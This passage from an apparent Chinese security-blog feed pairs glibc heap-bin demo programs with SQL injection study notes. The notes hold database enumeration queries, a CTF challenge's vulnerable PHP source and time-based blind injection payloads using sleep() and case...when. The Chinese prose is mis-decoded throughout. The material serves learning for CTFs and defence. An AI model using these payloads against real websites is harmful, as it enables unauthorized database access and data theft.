class="line">    <span class="keyword">int</span> size2=<span class="number">0x200</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">int</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">int</span> *p2=<span class="built_in">malloc</span>(size2);</span><br><span class="line">    <span class="keyword">int</span> *temp=<span class="built_in">malloc</span>(<span class="built_in">size</span>); <span class="comment">//é˜²æ­¢p2å’Œp3éƒ½è¢«é‡Šæ”¾ä¹‹åï¼Œp2å’Œp3å‘ç”Ÿåˆå¹¶</span></span><br><span class="line">    <span class="keyword">int</span> *p3=<span class="built_in">malloc</span>(size2);</span><br><span class="line">    <span class="keyword">int</span> *temp2=<span class="built_in">malloc</span>(<span class="built_in">size</span>); <span class="comment">//é˜²æ­¢p3è¢«é‡Šæ”¾ä¹‹åä¸topchunkåˆå¹¶</span></span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//åªä¸ºæ‰“æ–­ç‚¹ä½¿ç”¨</span></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ç›´æ¥çœ‹é‡Šæ”¾p1 p2 p3</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216155717972.png" alt="image-20201216155717972"></p><p>è¿™é‡Œç»§ç»­æƒ³ä¸€ä¸‹ä¸‹ä¸€æ­¥ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ</p><ul><li>åˆ†é…å¤§å°0x100å¯ä»¥åˆ†é… é‚£ä¹ˆå°±ç›´æ¥è§¦å‘consolidateè¯´æ˜smallbinä¸­å°±ä¼šæœ‰free chunk</li><li>lastremainderä¼šæ”¾å…¥unsortedbinä¸­ï¼Œæ­¤å¤–fastfreechunkä¸ä¼šåˆå¹¶</li><li>é‚£ä¹ˆæˆ‘ä»¬å°±å¾—åˆ°äº†</li></ul><p><img src="/2020/12/15/%E5%A0%86/image-20201216160152597.png" alt="image-20201216160152597"></p></blockquote><h4 id="6-æ¼”ç¤ºä¸‰"><a href="#6-æ¼”ç¤ºä¸‰" class="headerlink" title="6.æ¼”ç¤ºä¸‰"></a>6.æ¼”ç¤ºä¸‰</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x300</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">int</span> *p2=<span class="built_in">malloc</span>(<span class="built_in">size</span>);  <span class="comment">//é˜²æ­¢p1è¢«é‡Šæ”¾ä¹‹åä¸topchunkåˆå¹¶</span></span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//ä¸ºäº†ç¨‹åºæ‰“æ–­ç‚¹ä½¿ç”¨ï¼Œæ— å…¶ä»–ä½œç”¨</span></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x700</span>);</span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ç›´æ¥çœ‹p1é‡Šæ”¾å</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216160410739.png" alt="image-20201216160410739"></p><p>ä¹‹åä¼šåˆ†é…0x700è¯´æ˜è¦åˆ†é…è¾ƒå¤§çš„chunk æ­¤æ—¶ä¼šè¢«æ•´ç†åˆ°smallbinsä¸­</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216160827250.png" alt="image-20201216160827250"></p><p>ç»§ç»­åˆ†é…0x200 lastremainderä¼šè¿›å…¥unsortedbinä¸­</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216160910272.png" alt="image-20201216160910272"></p></blockquote><h4 id="7-æ¼”ç¤ºå››"><a href="#7-æ¼”ç¤ºå››" class="headerlink" title="7.æ¼”ç¤ºå››"></a>7.æ¼”ç¤ºå››</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x300</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> *temp=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="keyword">int</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//é˜²æ­¢p1é‡Šæ”¾å¹¶consolidateåˆ°smallbinsä¸­ä¹‹åï¼Œå†é‡Šæ”¾p2å¯¼è‡´p1å’Œp2åˆå¹¶ï¼Œåˆå¹¶ä¹‹ååˆè¢«æ”¾å…¥unsortedbinä¸­</span></span><br><span class="line">    <span class="keyword">int</span> *temp2=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">int</span> *p2=<span class="built_in">malloc</span>(<span class="number">0x100</span>); </span><br><span class="line">    <span class="keyword">int</span> *p3=<span class="built_in">malloc</span>(<span class="built_in">size</span>);<span class="comment">//é˜²æ­¢p2è¢«é‡Šæ”¾ä¹‹åä¸topchunkåˆå¹¶</span></span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//ä¸ºäº†ç¨‹åºæ‰“æ–­ç‚¹ä½¿ç”¨ï¼Œæ— å…¶ä»–ä½œç”¨</span></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x700</span>);</span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">free</span>(temp);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>å…ˆçœ‹å †ä¿¡æ¯</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216164710877.png" alt="image-20201216164710877"></p><p>é‡Šæ”¾p1</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216164747866.png" alt="image-20201216164747866"></p><p>åˆ†é…0x700 ç”±äºunsorted binä¸­çš„chunkä¸å¤Ÿ æ‰€ä»¥ç›´æ¥ä»top chunkä¸­åˆ†å‰²</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216164913709.png" alt="image-20201216164913709"></p><p>free tmpå’Œp2</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216165109899.png" alt="image-20201216165109899"></p><p>é‡ç‚¹æ¥çœ‹æœ€åä¸€æ­¥ è¿™é‡Œï¼Œmalloc(0x200)ï¼Œæ­¤æ—¶mallocä¼šåˆ‡å‰²smallbinsä¸­çš„p1ï¼Œå¹¶äº§ç”Ÿlast remainderï¼ˆ0x602250ï¼‰ï¼Œå¹¶æŠŠlast remainderæ”¾å…¥åˆ°unsortedbinä¸­ã€‚ç”±äºåˆ‡å‰²chunkå¹¶äº§ç”Ÿlast remainderä¼šå‘ç”Ÿconsolidateï¼Œæ‰€ä»¥unsortedbinä¸­çš„p2ä»unsortedbinä¸­æ•´ç†åˆ°smallbinsä¸­ï¼ˆç”±äºæ­¤ç§æƒ…å†µçš„consolidateä¸ä¼šæ•´ç†fastbinsä¸­çš„chunkï¼Œæ‰€ä»¥fastbinsä¸­çš„chunkä»ç„¶åœ¨fastbinsä¸­ï¼‰</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216165224983.png" alt="image-20201216165224983"></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å †-æŒç»­æ›´æ–°&quot;&gt;&lt;a href=&quot;#å †-æŒç»­æ›´æ–°&quot; class=&quot;headerlink&quot; title=&quot;å †(æŒç»­æ›´æ–°)&quot;&gt;&lt;/a&gt;å †(æŒç»­æ›´æ–°)&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://ld1ng.com/2020/07/23/Heap/&quot; target=</summary>
      
    
    
    
    <category term="PWN" scheme="https://pz1o.top/categories/PWN/"/>
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
    <category term="å †" scheme="https://pz1o.top/tags/%E5%A0%86/"/>
    
  </entry>
  
  <entry>
    <title>SQLæ³¨å…¥</title>
    <link href="https://pz1o.top/2020/12/09/SQL%E6%B3%A8%E5%85%A5/"/>
    <id>https://pz1o.top/2020/12/09/SQL%E6%B3%A8%E5%85%A5/</id>
    <published>2020-12-09T15:38:24.000Z</published>
    <updated>2020-12-09T15:39:32.233Z</updated>
    
    <content type="html"><![CDATA[<p>æˆ‘å°±å•çº¯æƒ³æŠŠè¿™äº›ä¸œè¥¿å­˜ä¸‹æ¥</p><h1 id="åŸºç¡€å­¦ä¹ "><a href="#åŸºç¡€å­¦ä¹ " class="headerlink" title="åŸºç¡€å­¦ä¹ "></a>åŸºç¡€å­¦ä¹ </h1><h2 id="1-SQLæ³¨å…¥çš„åˆ†ç±»"><a href="#1-SQLæ³¨å…¥çš„åˆ†ç±»" class="headerlink" title="1.SQLæ³¨å…¥çš„åˆ†ç±»"></a>1.SQLæ³¨å…¥çš„åˆ†ç±»</h2><ul><li><h3 id="åŸºäºä»æœåŠ¡å™¨æ¥æ”¶åˆ°çš„å“åº”"><a href="#åŸºäºä»æœåŠ¡å™¨æ¥æ”¶åˆ°çš„å“åº”" class="headerlink" title="åŸºäºä»æœåŠ¡å™¨æ¥æ”¶åˆ°çš„å“åº”"></a>åŸºäºä»æœåŠ¡å™¨æ¥æ”¶åˆ°çš„å“åº”</h3><ul><li><h4 id="åŸºäºé”™è¯¯çš„SQLæ³¨å…¥"><a href="#åŸºäºé”™è¯¯çš„SQLæ³¨å…¥" class="headerlink" title="åŸºäºé”™è¯¯çš„SQLæ³¨å…¥"></a>åŸºäºé”™è¯¯çš„SQLæ³¨å…¥</h4></li><li><h4 id="è”åˆæŸ¥è¯¢çš„ç±»å‹"><a href="#è”åˆæŸ¥è¯¢çš„ç±»å‹" class="headerlink" title="è”åˆæŸ¥è¯¢çš„ç±»å‹"></a>è”åˆæŸ¥è¯¢çš„ç±»å‹</h4></li><li><h4 id="å †æŸ¥è¯¢æ³¨å°„"><a href="#å †æŸ¥è¯¢æ³¨å°„" class="headerlink" title="å †æŸ¥è¯¢æ³¨å°„"></a>å †æŸ¥è¯¢æ³¨å°„</h4></li><li><h4 id="SQLç›²æ³¨"><a href="#SQLç›²æ³¨" class="headerlink" title="SQLç›²æ³¨"></a>SQLç›²æ³¨</h4><ul><li><h5 id="åŸºäºå¸ƒå°”SQLç›²æ³¨"><a href="#åŸºäºå¸ƒå°”SQLç›²æ³¨" class="headerlink" title="åŸºäºå¸ƒå°”SQLç›²æ³¨"></a>åŸºäºå¸ƒå°”SQLç›²æ³¨</h5></li><li><h5 id="åŸºäºæ—¶é—´çš„SQLç›²æ³¨"><a href="#åŸºäºæ—¶é—´çš„SQLç›²æ³¨" class="headerlink" title="åŸºäºæ—¶é—´çš„SQLç›²æ³¨"></a>åŸºäºæ—¶é—´çš„SQLç›²æ³¨</h5></li><li><h5 id="åŸºäºæŠ¥é”™çš„SQLç›²æ³¨"><a href="#åŸºäºæŠ¥é”™çš„SQLç›²æ³¨" class="headerlink" title="åŸºäºæŠ¥é”™çš„SQLç›²æ³¨"></a>åŸºäºæŠ¥é”™çš„SQLç›²æ³¨</h5></li></ul></li></ul></li></ul><ul><li><h3 id="åŸºäºå¦‚ä½•å¤„ç†è¾“å…¥çš„SQLæŸ¥è¯¢"><a href="#åŸºäºå¦‚ä½•å¤„ç†è¾“å…¥çš„SQLæŸ¥è¯¢" class="headerlink" title="åŸºäºå¦‚ä½•å¤„ç†è¾“å…¥çš„SQLæŸ¥è¯¢"></a>åŸºäºå¦‚ä½•å¤„ç†è¾“å…¥çš„SQLæŸ¥è¯¢</h3><ul><li><h5 id="åŸºäºå­—ç¬¦ä¸²"><a href="#åŸºäºå­—ç¬¦ä¸²" class="headerlink" title="åŸºäºå­—ç¬¦ä¸²"></a>åŸºäºå­—ç¬¦ä¸²</h5></li><li><h5 id="æ•°å­—æˆ–æ•´æ•°"><a href="#æ•°å­—æˆ–æ•´æ•°" class="headerlink" title="æ•°å­—æˆ–æ•´æ•°"></a>æ•°å­—æˆ–æ•´æ•°</h5></li></ul></li><li><h3 id="åŸºäºç¨‹åº¦å’Œé¡ºåºçš„æ³¨å…¥"><a href="#åŸºäºç¨‹åº¦å’Œé¡ºåºçš„æ³¨å…¥" class="headerlink" title="åŸºäºç¨‹åº¦å’Œé¡ºåºçš„æ³¨å…¥"></a>åŸºäºç¨‹åº¦å’Œé¡ºåºçš„æ³¨å…¥</h3><ul><li><h5 id="ä¸€é˜¶æ³¨å°„"><a href="#ä¸€é˜¶æ³¨å°„" class="headerlink" title="ä¸€é˜¶æ³¨å°„"></a>ä¸€é˜¶æ³¨å°„</h5></li><li><h5 id="äºŒé˜¶æ³¨å°„"><a href="#äºŒé˜¶æ³¨å°„" class="headerlink" title="äºŒé˜¶æ³¨å°„"></a>äºŒé˜¶æ³¨å°„</h5></li></ul></li><li><h3 id="åŸºäºæ³¨å…¥ç‚¹çš„ä½ç½®ä¸Šçš„"><a href="#åŸºäºæ³¨å…¥ç‚¹çš„ä½ç½®ä¸Šçš„" class="headerlink" title="åŸºäºæ³¨å…¥ç‚¹çš„ä½ç½®ä¸Šçš„"></a>åŸºäºæ³¨å…¥ç‚¹çš„ä½ç½®ä¸Šçš„</h3><ul><li><h5 id="é€šè¿‡ç”¨æˆ·è¾“å…¥çš„è¡¨å•åŸŸçš„æ³¨å°„"><a href="#é€šè¿‡ç”¨æˆ·è¾“å…¥çš„è¡¨å•åŸŸçš„æ³¨å°„" class="headerlink" title="é€šè¿‡ç”¨æˆ·è¾“å…¥çš„è¡¨å•åŸŸçš„æ³¨å°„"></a>é€šè¿‡ç”¨æˆ·è¾“å…¥çš„è¡¨å•åŸŸçš„æ³¨å°„</h5></li><li><h5 id="é€šè¿‡cookieæ³¨å°„"><a href="#é€šè¿‡cookieæ³¨å°„" class="headerlink" title="é€šè¿‡cookieæ³¨å°„"></a>é€šè¿‡cookieæ³¨å°„</h5></li><li><h5 id="é€šè¿‡æœåŠ¡å™¨å˜é‡"><a href="#é€šè¿‡æœåŠ¡å™¨å˜é‡" class="headerlink" title="é€šè¿‡æœåŠ¡å™¨å˜é‡"></a>é€šè¿‡æœåŠ¡å™¨å˜é‡</h5></li></ul></li></ul><h2 id="2-åŸºç¡€å‡½æ•°ä¸é€»è¾‘"><a href="#2-åŸºç¡€å‡½æ•°ä¸é€»è¾‘" class="headerlink" title="2.åŸºç¡€å‡½æ•°ä¸é€»è¾‘"></a>2.åŸºç¡€å‡½æ•°ä¸é€»è¾‘</h2><h3 id="1-åŸºç¡€å‡½æ•°"><a href="#1-åŸºç¡€å‡½æ•°" class="headerlink" title="1.åŸºç¡€å‡½æ•°"></a>1.åŸºç¡€å‡½æ•°</h3><p>â€‹    concat(str1,str2)   â€”â€”æ— åˆ†éš”è¿æ¥å­—ç¬¦ä¸²</p><p>â€‹    concat_ws(separator,str1,str2)   â€”â€”å«æœ‰åˆ†éš”ç¬¦è¿æ¥å­—ç¬¦ä¸²</p><p>â€‹    group_concat(str1,str2)  â€”â€”ä»¥é€—å·åˆ†éš”æ¯ä¸€æ¡æ•°æ®ï¼Œè¿æ¥ä¸€ä¸ªç»„çš„å­—ç¬¦ä¸²</p><h3 id="2-åŸºç¡€é€»è¾‘"><a href="#2-åŸºç¡€é€»è¾‘" class="headerlink" title="2.åŸºç¡€é€»è¾‘"></a>2.åŸºç¡€é€»è¾‘</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$sql=<span class="string">"select * from users where id='$id' limit 0,1"</span>;</span><br></pre></td></tr></table></figure><p>æ­¤å¤„è€ƒè™‘ä¸¤ä¸ªç‚¹ï¼Œä¸€ä¸ªæ˜¯é—­åˆå‰é¢ä½ çš„ â€˜ å¦ä¸€ä¸ªæ˜¯å¤„ç†åé¢çš„ â€˜ ï¼Œä¸€èˆ¬é‡‡ç”¨ä¸¤ç§æ€è·¯ï¼Œé—­åˆåé¢çš„å¼•å·æˆ–è€…æ³¨é‡Šæ‰ï¼Œæ³¨é‡Šæ‰é‡‡ç”¨â€”+ æˆ–è€… #ï¼ˆ%23ï¼‰ã€‚</p><p>limit ä»0å¼€å§‹ï¼Œè‡³å°‘1ä¸ªæ•°æ®</p><p>limit 10  è‡³å°‘10ä¸ªæ•°æ®</p><h3 id="3-unionæ“ä½œç¬¦çš„ç”¨æ³•"><a href="#3-unionæ“ä½œç¬¦çš„ç”¨æ³•" class="headerlink" title="3.unionæ“ä½œç¬¦çš„ç”¨æ³•"></a>3.unionæ“ä½œç¬¦çš„ç”¨æ³•</h3><p>unionæ“ä½œç¬¦ç”¨äºåˆå¹¶ä¸¤ä¸ªæˆ–å¤šä¸ªselectè¯­å¥çš„ç»“æœé›†ã€‚ä½†æ³¨æ„çš„æ˜¯ï¼Œselectçš„è¯­å¥å¿…é¡»æœ‰ç›¸åŒæ•°é‡çš„åˆ—ï¼Œåˆ—ä¹Ÿæœ‰ç›¸åŒçš„ç±»å‹ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_names <span class="keyword">from</span> table_name1 <span class="keyword">union</span> <span class="keyword">select</span> column_names <span class="keyword">from</span> table_name2;</span><br></pre></td></tr></table></figure><h3 id="4-ä¸€èˆ¬æ“ä½œ"><a href="#4-ä¸€èˆ¬æ“ä½œ" class="headerlink" title="4.ä¸€èˆ¬æ“ä½œ"></a>4.ä¸€èˆ¬æ“ä½œ</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> information_schema; //è¿›å…¥ç³»ç»Ÿæ•°æ®åº“</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">tables</span>; </span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="string">'myclass'</span>; //æœç´¢å½“æ•°æ®åº“åä¸ºmyclassä¸­å„è¡¨çš„åå­—</span><br></pre></td></tr></table></figure><p><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200502160256194.png" alt="image-20200502160256194"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata; //çŒœæ•°æ®åº“</span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'æ•°æ®åº“å'</span>; //çŒœæŸåº“çš„æ•°æ®è¡¨</span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">form</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'è¡¨å'</span>; //çŒœæŸè¡¨çš„æ•°æ®æ®µ</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> *; //çŒœæ•°æ®æ®µçš„å†…å®¹</span><br></pre></td></tr></table></figure><p><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200502161927164_WPS%E5%9B%BE%E7%89%87.png" alt="image-20200502161927164_WPSå›¾ç‰‡"></p><h2 id="3-ç›²æ³¨çš„è®²è§£ï¼ˆå…ˆçœ‹1-4ä¹‹åå†æ¥çœ‹ï¼‰"><a href="#3-ç›²æ³¨çš„è®²è§£ï¼ˆå…ˆçœ‹1-4ä¹‹åå†æ¥çœ‹ï¼‰" class="headerlink" title="3.ç›²æ³¨çš„è®²è§£ï¼ˆå…ˆçœ‹1-4ä¹‹åå†æ¥çœ‹ï¼‰"></a>3.ç›²æ³¨çš„è®²è§£ï¼ˆå…ˆçœ‹1-4ä¹‹åå†æ¥çœ‹ï¼‰</h2><h3 id="1-åŸºäºå¸ƒå°”çš„SQLç›²æ³¨"><a href="#1-åŸºäºå¸ƒå°”çš„SQLç›²æ³¨" class="headerlink" title="1.åŸºäºå¸ƒå°”çš„SQLç›²æ³¨"></a>1.åŸºäºå¸ƒå°”çš„SQLç›²æ³¨</h3><h3 id="2-åŸºäºæ—¶é—´çš„SQLç›²æ³¨"><a href="#2-åŸºäºæ—¶é—´çš„SQLç›²æ³¨" class="headerlink" title="2.åŸºäºæ—¶é—´çš„SQLç›²æ³¨"></a>2.åŸºäºæ—¶é—´çš„SQLç›²æ³¨</h3><p>æ—¶é—´ç›²æ³¨å’Œå¸ƒå°”ç›²æ³¨éå¸¸ç±»ä¼¼ï¼Œä½†æ—¶é—´ç›²æ³¨æ˜¯åˆ©ç”¨sleep()â€‹å’Œbenchmark()ç­‰å‡½æ•°è®©mysqlæ‰§è¡Œçš„æ—¶é—´å˜é•¿ã€‚</p><p>æ—¶é—´ç›²æ³¨å¤šä¸IF(expr1,expr2,expr3)ç»“åˆä½¿ç”¨ï¼Œå¦‚æœexpr1æ˜¯trueï¼Œåˆ™æ‰§è¡Œexpr2ï¼Œå¦åˆ™æ‰§è¡Œexpr3</p><h3 id="INSERT-INTOæ³¨å…¥-caseå»¶æ—¶ç›²æ³¨"><a href="#INSERT-INTOæ³¨å…¥-caseå»¶æ—¶ç›²æ³¨" class="headerlink" title="INSERT INTOæ³¨å…¥(caseå»¶æ—¶ç›²æ³¨)"></a>INSERT INTOæ³¨å…¥(caseå»¶æ—¶ç›²æ³¨)</h3><p>çœ‹äº†æºç çŸ¥é“å–xffå¤´,å¹¶ä¸”explodeè¿‡æ»¤é€—å·ã€‚é¢˜ç›®çš„æºç å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">function getIp()&#123;</span><br><span class="line">$ip &#x3D; &#39;&#39;;</span><br><span class="line">if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]))&#123;</span><br><span class="line">$ip &#x3D; $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];  &#x2F;&#x2F;è·å–è¯·æ±‚çš„ipåœ°å€</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$ip &#x3D; $_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr &#x3D; explode(&#39;,&#39;, $ip); &#x2F;&#x2F;å°†é€—å·è¿‡æ»¤</span><br><span class="line">return $ip_arr[0]; </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host&#x3D;&quot;localhost&quot;;</span><br><span class="line">$user&#x3D;&quot;&quot;;</span><br><span class="line">$pass&#x3D;&quot;&quot;;</span><br><span class="line">$db&#x3D;&quot;&quot;;</span><br><span class="line"></span><br><span class="line">$connect &#x3D; mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) or die(&quot;Unable to select database&quot;);</span><br><span class="line"></span><br><span class="line">$ip &#x3D; getIp();</span><br><span class="line">echo &#39;your ip is :&#39;.$ip;</span><br><span class="line">$sql&#x3D;&quot;insert into client_ip (ip) values (&#39;$ip&#39;)&quot;;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜æ˜¯<strong>ç›²æ³¨</strong>é¢˜ç›®è¯´å¾—ä¹Ÿå¾ˆæ˜ç™½ï¼Œé—®é¢˜æ˜¯æ€ä¹ˆæ³¨å…¥å‘¢ï¼Ÿè¿™é‡Œæœ‰ä¸¤ä¸ªé—®é¢˜</p><ul><li>ç¬¬ä¸€ä¸ªæ˜¯ç†è§£<code>insert...into</code>æ³¨å…¥</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">insert into client_ip(ip) values (&#39;$ip&#39;);</span><br><span class="line">&#x2F;&#x2F;è¿™é‡Œä¸»è¦ç»“åˆsleep()è¿›è¡Œæ³¨å…¥</span><br><span class="line">insert into student(id,name) values (1,&#39;&#39;+(select sleep(3)))</span><br><span class="line">&#x2F;&#x2F;è¿™æ ·å°±æ’å…¥äº†ä¸€æ¡id&#x3D;1,name&#x3D;nullçš„æ•°æ®</span><br></pre></td></tr></table></figure><ul><li>ç¬¬äºŒä¸ªæ˜¯è¿‡æ»¤é€—å·çš„ï¼Œ<strong>æ‰€ä»¥ä¸èƒ½ç”¨<code>if(a,b,c)</code>åº”è¯¥ç”¨<code>case...when...then</code>åŒæ—¶å¸¸ç”¨çš„æˆªå–å­—ç¬¦ä¸²å‡½æ•°<code>substr([str],[start],[len])</code>ä¹Ÿæœ‰æ›¿ä»£çš„<code>substr([str]from [strat] for [len])</code></strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">case...when...then</span><br><span class="line">ç®€å•caseå‡½æ•°</span><br><span class="line">case sex when &#39;1&#39; then &#39;nan&#39;</span><br><span class="line">when &#39;2&#39; then &#39;nv&#39;</span><br><span class="line">else &#39;qita&#39; end</span><br><span class="line">caseæœç´¢å‡½æ•°</span><br><span class="line">case when sex &#x3D; &#39;1&#39; then &#39;nan&#39;</span><br><span class="line"> when sex &#x3D; &#39;2&#39; then &#39;nv</span><br><span class="line"> else &#39;qita&#39; end</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥åªéœ€è¦æ„é€ å°±å¯ä»¥äº†ã€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 